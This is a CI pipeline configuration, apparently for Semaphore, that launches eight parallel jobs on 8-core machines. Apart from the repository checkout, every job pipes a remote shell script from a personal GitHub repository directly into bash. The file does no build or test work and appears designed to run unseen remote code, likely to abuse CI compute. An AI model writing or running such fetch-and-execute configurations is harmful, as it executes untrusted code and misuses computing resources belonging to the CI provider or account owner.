version: v1.0
name: Parallel
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - checkout
            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
        - name: 'Job #2'
          commands:
            - checkout
            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
        - name: 'Job #3'
          commands:
            - checkout
            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
        - name: 'Job #4'
          commands:
            - checkout
            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
after_pipeline:
  task:
    jobs:
      - name: 'Job #1'
        commands:
          - checkout
          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
      - name: 'Job #2'
        commands:
          - checkout
          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
      - name: 'Job #3'
        commands:
          - checkout
          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
      - name: 'Job #4'
        commands:
          - checkout
          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
